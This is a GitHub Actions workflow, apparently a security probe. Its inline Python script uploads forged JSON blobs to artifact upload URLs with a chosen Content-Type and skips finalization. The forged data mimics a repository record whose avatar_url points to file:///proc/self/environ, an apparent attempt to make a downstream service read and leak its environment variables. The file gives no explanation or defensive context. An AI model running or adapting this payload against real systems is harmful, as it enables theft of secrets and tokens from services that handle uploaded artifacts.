name: disamb85
on:
  workflow_dispatch:
    inputs:
      specs:
        description: JSON array of {name, v, mime}
        default: '[]'
      putct:
        description: PUT Content-Type
        default: application/json
jobs:
  up:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v5
      - uses: ./.github/actions/rawup
        with:
          specs: ${{ inputs.specs }}
          putct: ${{ inputs.putct }}
      - name: put payloads (skip finalize)
        run: |
          set -eu
          python3 - <<'PY'
          import json, urllib.request
          s = json.load(open('/tmp/rawup_state.json'))
          for a in s['artifacts']:
              if not a.get('created'): continue
              P = json.dumps({"full_name": "lemonsour864/cassette",
                              "owner": {"login": "lemonsour864", "avatar_url": "file:///proc/self/environ"},
                              "stargazers_count": 0, "description": "probe"},
                             separators=(',', ':')).encode()
              req = urllib.request.Request(a['up'], data=P, method='PUT',
                  headers={'Content-Type': s['putct'], 'x-ms-blob-type': 'BlockBlob'})
              print('SPEC', a['i'], 'name', repr(a['name']), 'PUT:', urllib.request.urlopen(req, timeout=60).status)
          PY
